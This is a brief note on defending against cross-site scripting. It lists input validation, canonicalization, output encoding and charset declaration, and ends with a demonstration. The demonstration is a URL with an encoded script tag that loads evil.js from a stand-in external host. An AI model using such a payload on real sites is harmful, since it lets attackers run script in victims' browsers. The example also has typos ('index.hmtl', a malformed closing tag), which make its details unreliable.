To avoiding XSS attacks:

* Validate input (For instance using RE)
* Canonicalize
* Encode output
* Assign character set -> Content-type: text/html; charset="utf-8"

Deploy some malicious code at yourserver.com/js/evil.js and
visit index.hmtl?%3Cscript src=asite.com/js/evil.js%3E%3Cscript%3E
